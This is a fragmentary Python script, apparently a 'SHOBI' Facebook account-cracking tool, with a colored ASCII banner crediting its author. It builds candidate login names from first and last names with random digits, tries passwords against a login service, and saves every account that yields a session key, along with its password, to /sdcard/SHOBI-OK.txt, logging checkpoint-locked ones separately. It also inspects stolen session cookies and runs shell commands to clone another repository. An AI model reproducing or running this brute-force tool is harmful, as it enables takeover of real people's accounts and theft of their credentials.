...
logo=("""\033[1;97m
             ...
             \033[1;35m . 
              \033[1;35m .   _____ _    _  ____  ____ _____ 
              \033[1;35m .  / ____| |  | |/ __ \|  _ \_   _|
              \033[1;35m . | (___ | |__| | |  | | |_) || |  
             \033[1;35m .   \___ \|  __  | |  | |  _ < | |  
              \033[1;35m .  ____) | |  | | |__| | |_) || |_ 
              \033[1;35m . |_____/|_|  |_|\____/|____/_____|
...
\033[1;37m  -----------------------⚔️------------------------
       ...
       \033[1;37mAUTHOR    🔰H A S T E R📌
       \033[1;37mFacebook  🔰S H O B I📌
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/SHOBI-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=SHOBI-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=SHOBI-2233]'))
 
 
####@-----Gmail-----@####
 
def gmail():     
        os.system('rm -rf .SHOBI')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.SHOBI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.SHOBI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.SHOBI', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/SHOBI-OK.txt")
    print('\033[1;93m='*25)
    print()
     ...
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSHOBI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SHOBI-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSHOBI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SHOBI-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
